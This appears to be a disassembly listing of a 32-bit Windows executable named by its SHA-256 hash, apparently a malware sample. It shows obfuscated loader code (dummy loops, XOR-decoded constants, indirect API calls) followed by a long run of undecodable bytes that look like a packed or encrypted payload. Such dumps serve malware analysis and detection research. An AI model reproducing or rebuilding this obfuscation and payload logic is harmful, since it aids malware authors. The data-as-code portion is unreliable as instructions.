
cb46ec3512ebbcf9da1419b9aa0b79806f5646455594fd1a7e1e13d6ca72e83a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421912
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421a1e
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x42351e
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4235e5
  4012ea:	push   0x423669
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	call   0x40914a
  401431:	test   eax,eax
  401433:	je     0x401464
  401439:	lea    eax,[ebp-0x90]
  40143f:	push   eax
  401440:	mov    eax,DWORD PTR [ebp-0x30]
  401443:	xor    eax,esi
  401445:	add    eax,edi
  401447:	push   eax
  401448:	mov    eax,DWORD PTR [ebp-0x2c]
  40144b:	add    eax,0xaa
  401450:	push   eax
  401451:	mov    eax,DWORD PTR [ebp-0x2c]
  401454:	mov    eax,DWORD PTR [eax+0x198]
  40145a:	push   DWORD PTR [eax]
  40145c:	call   0x405c6f
  401461:	mov    DWORD PTR [ebp-0x40],eax
  401464:	lea    eax,[ebp+0x4]
  401467:	mov    DWORD PTR [ebp-0x34],eax
  40146a:	mov    eax,DWORD PTR [ebp-0x8]
  40146d:	mov    eax,DWORD PTR [eax]
  40146f:	mov    eax,DWORD PTR [eax]
  401471:	mov    eax,DWORD PTR [eax]
  401473:	test   eax,eax
  401475:	je     0x4038ab
  40147b:	lea    eax,[ebp-0xc]
  40147e:	mov    DWORD PTR [ebp-0x4c],eax
  401481:	mov    eax,DWORD PTR [ebp-0x3c]
  401484:	mov    DWORD PTR [ebp-0xc],eax
  401487:	mov    eax,DWORD PTR [ebp-0x8]
  40148a:	mov    eax,DWORD PTR [eax]
  40148c:	mov    eax,DWORD PTR [eax]
  40148e:	mov    eax,DWORD PTR [eax]
  401490:	sub    DWORD PTR [ebp-0xc],eax
  401493:	mov    ecx,DWORD PTR [ebp-0x10]
  401496:	xor    ecx,esi
  401498:	mov    eax,0xffcd8d25
  40149d:	sub    eax,ecx
  40149f:	jmp    0x403854
  4014a4:	out    dx,al
  4014a5:	add    eax,0x6723a723
  4014aa:	outs   dx,BYTE PTR ds:[esi]
  4014ab:	sbb    DWORD PTR [edx+0x1b],0xf
  4014af:	hlt    
  4014b0:	(bad)  
  4014b1:	cmp    eax,0x62622b3b
  4014b6:	bound  esp,QWORD PTR [edx-0x36]
  4014b9:	pop    edi
  4014ba:	bound  esp,QWORD PTR [edx+0x9]
  4014bd:	sub    eax,DWORD PTR [edi]
  4014bf:	pop    edx
  4014c0:	add    eax,0x792c0356
  4014c5:	jne    0x40153c
  4014c7:	inc    edi
  4014c8:	add    dh,bl
  4014ca:	jb     0x401510
  4014cc:	jno    0x4014f3
  4014ce:	iret   
  4014cf:	retf   
  4014d0:	hlt    
  4014d1:	inc    ebp
  4014d2:	aam    0x97
  4014d4:	cdq    
  4014d5:	add    ebp,DWORD PTR [edx]
  4014d7:	pop    esp
  4014d8:	jno    0x401544
  4014da:	mov    es,WORD PTR [edx-0x43be3b9c]
  4014e0:	daa    
  4014e1:	mov    ecx,0x54f9627
  4014e6:	shr    BYTE PTR [ebp+eax*1+0x2],1
  4014ea:	adc    cl,al
  4014ec:	(bad)  
  4014ed:	(bad)  [esi-0x78]
  4014f0:	and    BYTE PTR [esi+0x31c900b0],dl
  4014f6:	dec    esi
  4014f7:	fbstp  TBYTE PTR [edx-0x62cc368d]
  4014fd:	mov    cs,WORD PTR [eax+0x78]
  401500:	jo     0x4014b8
  401502:	dec    edi
  401503:	pushf  
  401504:	pop    eax
  401505:	jae    0x401491
  401507:	sti    
  401508:	push   es
  401509:	push   0xc72c3d54
  40150e:	pop    esi
  40150f:	cmp    BYTE PTR [edx+0x6c],dl
  401512:	add    ecx,DWORD PTR [edi]
  401514:	push   ss
  401515:	jge    0x40153e
  401517:	mov    ebx,0xa6ab63c3
  40151c:	mov    esp,0xc531c291
  401521:	stc    
  401522:	inc    ebx
  401523:	popf   
  401524:	xchg   edx,eax
  401525:	in     eax,0x12
  401527:	fstp   QWORD PTR [edx]
  401529:	jg     0x4014c9
  40152b:	cmp    ecx,edi
  40152d:	mov    al,ds:0xdb808269
  401532:	dec    ecx
  401533:	loop   0x4014ee
  401535:	inc    eax
  401536:	or     BYTE PTR [ebx],0x2c
  401539:	inc    ebx
  40153a:	pop    ecx
  40153b:	mov    ecx,0xda183803
  401540:	xor    ebx,DWORD PTR [esi+0x22]
  401543:	sbb    ch,BYTE PTR [ebx+ecx*1]
  401546:	inc    esi
  401547:	add    esp,DWORD PTR [eax-0x32d94fe1]
  40154d:	dec    ebp
  40154e:	nop
  40154f:	xchg   edi,eax
  401550:	dec    esi
  401551:	mov    cl,0x25
  401553:	pop    ecx
  401554:	les    ebp,FWORD PTR [eax]
  401556:	sub    eax,ecx
  401558:	vpsubusw xmm0,xmm7,XMMWORD PTR [edi-0x25]
  40155d:	mov    edi,0xdb06d0ab
  401562:	test   al,0x7e
  401564:	bound  edx,QWORD PTR [ebp+0x268b1b46]
  40156a:	in     eax,0xc2
  40156c:	push   ds
  40156d:	sub    DWORD PTR [ebp+0x6c],0x51
  401571:	imul   ebp,edx,0x8bad0cb4
  401577:	dec    esp
  401578:	sbb    ebx,DWORD PTR [ecx+0x5]
  40157b:	leave  
  40157c:	nop
  40157d:	popa   
  40157e:	loop   0x40156e
  401580:	push   0xfffffff9
  401582:	mov    esp,0xf3d91ae4
  401587:	dec    ebp
  401588:	ret    0x933
  40158b:	dec    ebx
  40158c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40158d:	ins    BYTE PTR es:[edi],dx
  40158e:	and    eax,0x575f4a39
  401593:	dec    ecx
  401594:	int3   
  401595:	jecxz  0x40157d
  401597:	(bad)  
  401598:	mov    ebp,0xb6f50938
  40159d:	and    al,0xde
  40159f:	stos   DWORD PTR es:[edi],eax
  4015a0:	lds    edi,FWORD PTR [esi+0x440d43be]
  4015a6:	pop    ss
  4015a7:	push   0xffffffd5
  4015a9:	out    0xea,al
  4015ab:	sbb    edx,DWORD PTR [edi]
  4015ad:	leave  
  4015ae:	repnz in al,dx
  4015b0:	inc    eax
  4015b1:	stc    
  4015b2:	imul   ecx,DWORD PTR [edi+0x1923b477],0x69
  4015b9:	add    DWORD PTR [ebx],eax
  4015bb:	jecxz  0x401604
  4015bd:	into   
  4015be:	icebp  
  4015bf:	pushf  
  4015c0:	pop    esp
  4015c1:	ja     0x40156c
  4015c3:	add    ah,BYTE PTR [edi+0x3458def8]
  4015c9:	rcl    BYTE PTR [ebp+0x4a],0xd6
  4015cd:	addr16 out dx,al
  4015cf:	cmovnp eax,eax
  4015d2:	mov    es,WORD PTR [esi+0x1713a376]
  4015d8:	ss jg  0x401619
  4015db:	and    ah,BYTE PTR [esi+0xe28e87f]
  4015e1:	ja     0x4015b1
  4015e3:	stc    
  4015e4:	jge    0x40160e
  4015e6:	outs   dx,BYTE PTR ds:[esi]
  4015e7:	cmp    al,0x2a
  4015e9:	jb     0x40158c
  4015eb:	(bad)  
  4015ec:	into   
  4015ed:	sbb    eax,0xfddca915
  4015f2:	pop    edi
  4015f4:	in     al,dx
  4015f5:	xor    DWORD PTR [eax],esi
  4015f7:	sub    eax,0xfadd4f92
  4015fc:	inc    edx
  4015fd:	xchg   edi,eax
  4015fe:	jge    0x4015e5
  401600:	outs   dx,DWORD PTR ds:[esi]
  401601:	inc    ebx
  401602:	je     0x40158e
  401604:	sub    ah,BYTE PTR [edi]
  401606:	mov    bh,0xbb
  401608:	in     al,0x8f
  40160a:	popf   
  40160b:	xchg   esp,eax
  40160c:	jmp    0xd50af726
  401611:	aas    
  401612:	fstp   QWORD PTR [edx-0x54]
  401615:	mov    DWORD PTR [esi-0x3a1840a4],ecx
  40161b:	push   0xfc240b4
  401620:	mov    edx,0x396cd1d
  401625:	fwait
  401626:	call   DWORD PTR [eax+0x3c]
  401629:	xor    ecx,DWORD PTR ds:[eax+0x2f1d7717]
  401630:	sub    eax,0x6428d2a9
  401635:	inc    edi
  401636:	adc    ebp,edx
  401638:	ror    DWORD PTR [edx-0x7b],1
  40163b:	test   BYTE PTR ds:0x7193b82d,dl
  401641:	std    
  401642:	popa   
  401643:	cmc    
  401644:	mov    dh,BYTE PTR [ecx]
  401646:	jle    0x401619
  401648:	(bad)  
  401649:	repz adc BYTE PTR [ebp-0x9],dh
  40164d:	xchg   edx,eax
  40164e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40164f:	jl     0x40164d
  401651:	xor    DWORD PTR [edi-0x14],0xffffffd7
  401655:	lods   al,BYTE PTR ds:[esi]
  401656:	mov    al,ds:0xebdcf8d0
  40165b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40165c:	(bad)
  40165f:	sub    eax,0x3f8c2daf
  401664:	mov    edx,0x333833f2
  401669:	cmp    eax,0xadc6f436
  40166e:	adc    eax,DWORD PTR [edx]
  401670:	xchg   ebp,eax
  401671:	retf   0xed4c
  401674:	mov    ecx,0xbad31c1b
  401679:	fist   WORD PTR [ebx]
  40167b:	out    0x65,eax
  40167d:	or     BYTE PTR [edx],ch
  40167f:	add    dl,bl
  401681:	mov    ds:0x3b9020fd,al
  401686:	call   0x80a69740
  40168b:	push   0xffffffd2
  40168d:	sbb    bh,ch
  40168f:	adc    BYTE PTR [eax-0x49d36791],ch
  401695:	inc    edx
  401696:	mov    dl,BYTE PTR [ecx+edi*8+0x19]
  40169a:	outs   dx,DWORD PTR ds:[esi]
  40169b:	mov    cl,0xf9
  40169d:	in     al,dx
  40169e:	stc    
  40169f:	cmp    esp,DWORD PTR [edi+0x11155215]
  4016a5:	xor    eax,0x505a35ce
  4016aa:	sbb    eax,0x8fad73da
  4016af:	and    eax,0xccc2d623
  4016b4:	or     eax,0xcccbb592
  4016b9:	push   ebx
  4016ba:	mov    edi,0xab49a42e
  4016bf:	push   ebp
  4016c0:	sub    ecx,DWORD PTR [esi+ebx*8+0x1e93dd9a]
  4016c7:	js     0x4016db
  4016c9:	and    ch,BYTE PTR [edx-0x5c200413]
  4016cf:	and    eax,0xc369a539
  4016d4:	mov    ah,0xbe
  4016d6:	out    0xc8,al
  4016d8:	int3   
  4016d9:	dec    edx
  4016da:	push   eax
  4016db:	adc    dl,BYTE PTR [ebx]
  4016dd:	rcl    BYTE PTR [esi-0x27fb24bf],cl
  4016e3:	inc    esp
  4016e4:	es imul edx,DWORD PTR cs:[ecx+0x4da3f692],0x29298fe5
  4016f0:	repz inc esi
  4016f2:	or     ebx,ebx
  4016f4:	xor    ch,BYTE PTR [esi]
  4016f6:	jl     0x4016cc
  4016f8:	mov    al,ds:0x6f48f5c2
  4016fd:	xchg   ebp,eax
  4016fe:	cdq    
  4016ff:	or     eax,edi
  401701:	or     DWORD PTR [ebp+0x4a],0xffffffaa
  401705:	leave  
  401706:	test   BYTE PTR [eax],dl
  401708:	out    dx,eax
  401709:	mov    WORD PTR [edx],?
  40170b:	icebp  
  40170c:	add    bh,dl
  40170e:	mov    al,0x6e
  401710:	clc    
  401711:	fnstcw WORD PTR [ebx+0x1c]
  401714:	xchg   edx,eax
  401715:	lock sbb al,0x56
  401718:	xchg   ebp,eax
  401719:	adc    ebp,ecx
  40171b:	add    ebx,DWORD PTR [ebx+0x1bd4a9b]
  401721:	sbb    bl,ah
  401723:	xchg   ah,bh
  401725:	sti    
  401726:	repz or ch,BYTE PTR [ecx-0x19ae602f]
  40172d:	shl    DWORD PTR [esi-0x1efa3977],cl
  401733:	push   esp
  401734:	fdiv   DWORD PTR [ebp+0x4972469c]
  40173a:	jnp    0x4016cf
  40173c:	cwde   
  40173d:	retf   0xb949
  401740:	jo     0x40171b
  401742:	cmp    DWORD PTR ds:0x9cac7735,ecx
  401748:	scas   eax,DWORD PTR es:[edi]
  401749:	or     dl,0xa6
  40174c:	repnz retf 
  40174e:	push   cs
  40174f:	out    0x25,al
  401751:	(bad)  
  401752:	sahf   
  401753:	pop    edx
  401754:	jmp    0x40177f
  401756:	push   ds
  401757:	adc    al,0xec
  401759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40175a:	push   ebp
  40175b:	or     dh,al
  40175d:	mov    BYTE PTR [ebx],bh
  40175f:	pusha  
  401760:	fild   DWORD PTR [esi-0x2c8626af]
  401766:	xchg   ecx,eax
  401767:	(bad)  
  401768:	adc    cl,bh
  40176a:	pusha  
  40176b:	mov    ecx,0xc9c1068d
  401770:	mov    bh,BYTE PTR [edx+edx*2+0x8]
  401774:	shr    DWORD PTR [eax+0x88535fa],cl
  40177a:	(bad)  
  40177b:	rcl    ebx,1
  40177d:	dec    edi
  40177e:	pop    ss
  40177f:	xchg   esp,esi
  401781:	jle    0x401756
  401783:	ins    BYTE PTR es:[edi],dx
  401784:	sbb    dh,dl
  401786:	sub    DWORD PTR [edi+ebx*1-0x65],ecx
  40178a:	jle    0x401791
  40178c:	push   edx
  40178d:	lahf   
  40178e:	je     0x401777
  401790:	cmp    esp,ebx
  401792:	cmp    DWORD PTR [ecx],edx
  401794:	ret    0x7835
  401797:	gs hlt 
  401799:	(bad)  [ebx+eiz*2-0x3e516372]
  4017a0:	jbe    0x4017d2
  4017a2:	fild   QWORD PTR [esi]
  4017a4:	sbb    esp,DWORD PTR [esi]
  4017a6:	repnz inc eax
  4017a8:	dec    ebx
  4017a9:	add    eax,ecx
  4017ab:	push   esi
  4017ac:	mov    ch,0x0
  4017ae:	mov    ecx,0xc6157b7b
  4017b3:	test   BYTE PTR [ebp+0x5520f1bf],al
  4017b9:	ss pushf 
  4017bb:	daa    
  4017bc:	and    al,0x67
  4017be:	jb     0x401769
  4017c0:	repnz test BYTE PTR [edx-0x6e28bcfe],0xe9
  4017c8:	cli    
  4017c9:	je     0x401772
  4017cb:	adc    DWORD PTR [esi-0x41ed6db1],ebp
  4017d1:	into   
  4017d2:	xchg   esp,eax
  4017d3:	push   0x1441ed77
  4017d8:	out    0xe7,eax
  4017da:	pop    ebp
  4017db:	xchg   BYTE PTR [eax+0x692ee05f],dl
  4017e1:	pop    esi
  4017e2:	loop   0x40178d
  4017e4:	aad    0xd
  4017e6:	xor    bl,al
  4017e8:	pop    ds
  4017e9:	test   eax,0xbaf4350d
  4017ee:	ja     0x401815
  4017f0:	push   ebx
  4017f1:	sbb    eax,esp
  4017f3:	push   0xc745e885
  4017f8:	push   gs
  4017fa:	mov    gs,WORD PTR [edx]
  4017fc:	jp     0x401800
  4017fe:	scas   eax,DWORD PTR es:[edi]
  4017ff:	test   ecx,0x6ed73ca3
  401805:	jnp    0x4017af
  401807:	fidivr DWORD PTR ss:[edx+0x6c0bb57b]
  40180e:	mov    ah,0xfb
  401810:	sbb    eax,0x7a2d2a3a
  401815:	cmp    eax,0xb3672b88
  40181a:	dec    esp
  40181b:	and    al,0x9a
  40181d:	adc    esi,DWORD PTR [edi+0x16869d0d]
  401823:	jg     0x40184a
  401825:	scas   al,BYTE PTR es:[edi]
  401826:	mov    DWORD PTR [ecx],eax
  401828:	mov    ch,BYTE PTR [edi]
  40182a:	cdq    
  40182b:	shl    BYTE PTR [edx+ecx*4+0x1b],cl
  40182f:	inc    ebx
  401830:	mov    bh,0x73
  401832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401833:	push   edx
  401834:	adc    cl,cl
  401836:	cmp    BYTE PTR [ecx-0x28],dh
  401839:	or     eax,0xdb0761ce
  40183e:	adc    bh,cl
  401840:	adc    eax,0xee2c3101
  401845:	test   BYTE PTR [ebx+0x31],bl
  401848:	xchg   edx,eax
  401849:	shl    ah,0x91
  40184c:	push   esi
  40184d:	cmp    ecx,DWORD PTR [eax]
  40184f:	lahf   
  401850:	(bad)  
  401851:	mov    edx,0x95255ecc
  401856:	xchg   ebp,eax
  401857:	and    dh,0x84
  40185a:	shr    DWORD PTR [edx+eax*8+0x604023a6],cl
  401861:	push   esp
  401862:	outs   dx,BYTE PTR ds:[esi]
  401863:	adc    bl,BYTE PTR [ebx]
  401865:	adc    cl,al
  401867:	mov    dh,0xaa
  401869:	xor    bl,BYTE PTR [edx+edi*1-0xf75935c]
  401870:	adc    bh,0xd3
  401873:	jbe    0x4018f3
  401875:	jnp    0x401808
  401877:	(bad)  
  401878:	push   0x103f82d2
  40187d:	loopne 0x401834
  40187f:	cmp    dh,ah
  401881:	(bad)  
  401882:	sbb    bh,BYTE PTR [ebx-0x2feb4563]
  401888:	loope  0x4018b6
  40188a:	pop    esi
  40188b:	push   ss
  40188c:	sub    al,0x2e
  40188e:	or     edx,ecx
  401890:	add    DWORD PTR [edi+0x32de0e6],edi
  401896:	or     BYTE PTR es:[esi],al
  401899:	mov    dh,0xba
  40189b:	sbb    dh,BYTE PTR [edx-0x15c78bf0]
  4018a1:	mov    edi,0x958b8bf
  4018a6:	in     eax,dx
  4018a7:	loope  0x401835
  4018a9:	jne    0x4018d8
  4018ab:	out    dx,eax
  4018ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018ad:	jns    0x401867
  4018af:	inc    ebp
  4018b0:	leave  
  4018b1:	arpl   WORD PTR [edi+0x4f],cx
  4018b4:	inc    esi
  4018b5:	sbb    DWORD PTR [esi-0x5dc87e70],0x18288d5f
  4018bf:	mov    dl,0xd3
  4018c1:	cmp    BYTE PTR [ebx],bl
  4018c3:	mov    esi,DWORD PTR [ecx+0x7c848481]
  4018c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018ca:	pop    edx
  4018cb:	out    0x29,al
  4018cd:	not    edx
  4018cf:	jl     0x401865
  4018d1:	and    BYTE PTR [ecx],bl
  4018d3:	pop    edx
  4018d4:	repnz mov edi,0xf4bda0c6
  4018da:	aad    0xf4
  4018dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018dd:	call   FWORD PTR [ecx-0x2358a120]
  4018e3:	in     eax,0x2a
  4018e5:	xlat   BYTE PTR ds:[ebx]
  4018e6:	int3   
  4018e7:	mov    esi,0xd11ed663
  4018ec:	dec    BYTE PTR [ecx-0x37f2a458]
  4018f2:	cwde   
  4018f3:	jbe    0x4018b9
  4018f5:	pop    esp
  4018f6:	cmc    
  4018f7:	pushf  
  4018f8:	inc    ebp
  4018f9:	xchg   edi,eax
  4018fa:	mov    esi,0xab740721
  4018ff:	fxch   st(0)
  401901:	inc    ebp
  401902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401903:	retf   0xc22b
  401906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401907:	push   edx
  401908:	xor    DWORD PTR [esi],eax
  40190a:	sub    edx,edi
  40190c:	xchg   edx,eax
  40190d:	push   edx
  40190e:	(bad)  
  40190f:	jne    0x401946
  401911:	push   0x2e23be19
  401916:	dec    edi
  401917:	aaa    
  401918:	ins    DWORD PTR es:[edi],dx
  401919:	or     edx,edi
  40191b:	inc    esp
  40191c:	adc    ecx,DWORD PTR [eax+0x32]
  40191f:	std    
  401920:	jb     0x401949
  401922:	jo     0x401943
  401924:	lods   eax,DWORD PTR ds:[esi]
  401925:	add    al,BYTE PTR [ebp-0x44784c49]
  40192b:	retf   
  40192c:	clc    
  40192d:	(bad)  [edi+0x7]
  401930:	jne    0x4019a9
  401932:	add    eax,0x160c755a
  401937:	dec    eax
  401938:	sbb    edi,edi
  40193a:	sbb    esi,edi
  40193c:	jmp    0x23e7b612
  401941:	sbb    DWORD PTR fs:[edi+0x620d2d52],esi
  401948:	pop    esi
  401949:	fist   WORD PTR [ebx-0x1c]
  40194c:	mov    BYTE PTR [ebx-0x1a246be3],dh
  401952:	and    bl,BYTE PTR [esi]
